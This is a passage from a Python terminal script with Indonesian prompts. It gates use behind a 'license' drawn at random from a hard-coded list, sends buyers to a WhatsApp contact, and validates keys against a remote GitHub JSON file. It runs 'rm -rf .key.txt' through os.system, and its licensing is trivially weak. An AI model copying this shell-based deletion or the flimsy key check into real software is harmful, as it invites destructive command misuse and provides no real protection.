kentod = random.choice(["MORHE-UUQDM-OOFJR-IBRJZ","LIMPL-XDZGC-NNVDR-NXGXK","LHEZL-RPKJG-IPPOR-YWXGV","JOJQR-GKFVW-VLYJT-UNITI","GSNEP-NTRCE-CTKYK-OIAGD","LTQVM-NRQSC-LVJCL-SVQTD","HCYUY-ADXUB-MPCVJ-DGNQE","JHSQH-YAYOT-WDWFU-FAYIV","MTIRZ-YXKRT-ZEYGN-UWJMK","LWGOO-ZPRNJ-FKDXT-YNBZB","GTSCS-MEXZL-YXMLX-NLUCT","KWQRM-ROFYY-YLBST-BKXAE","LISBX-TPVSB-WXKEV-XOMIB","JVFEN-WKCFP-XLLXV-GAKUS","LEHBK-GBLHK-NACGN-EEHUW","KAEPL-IBDPP-WQYGN-PMUSI","KVIZG-ILJVO-EKFYT-THGKZ"])


kentodd=random.choice([kentod])


crot=(kentodd)

def getkey():
    import json, requests
    try:
        openkey = open(".key.txt","r").read()
        files = openkey.split("\n")[1]
        key = openkey.split("\n")[0]
    except FileNotFoundError:
        os.system("clear")
        banner();time.sleep(1)
        print("")
        asep(Panel.fit(" [green]License Anda Tidak Tersedia "));time.sleep(2)
        print ("")
        jalan("  [•] license anda :\033[32m "+crot);time.sleep(1)
        namamu = input("\033[0m  [•] nama anda : ")
        yt = input("\033[0m  [•] Chat Admin Untuk Beli Lisensi y/t? > ")
        if yt in ["Y","y"]:
            os.system("xdg-open https://wa.me/+6281320123492?text=Assalamualaikum+bang+lukman,+aku+mau+beli+scriptnya+tapi+yang+versi+premium.+Ini+lisensinya:%20"+crot+"+konfitmasi+nama+pembeli:%20"+namamu)
            open(".key.txt","w").write(crot+"\n"+namamu)
            exit()
        else:
            exit("[•] Telah keluar program")
    try:
        confirmkey = requests.get("https://raw.githubusercontent.com/LukmanXD/database/main/ya.json").json()
    except requests.exceptions.ConnectionError:
        print("[•] Jaringan Internet Kamu Tidak Ada");exit()
    if confirmkey[files] == key:
        if confirmkey[files] == "tidakada":
            print("\n[•] Lisensi key Kamu Sudah Kadaluarsa")
            os.system("rm -rf .key.txt");exit()
        else:
            login_kamu()
    else:
        print("\n[•] Lisensi key Kamu Sudah Kadaluarsa")
        os.system("rm -rf .key.txt");exit()

if __name__=='__main__':
    try:
    	getkey()
    except requests.exceptions.ConnectionError:
        exit(f'\n[{M}!{C}] Koneksi internet bermasalah')
    folder()

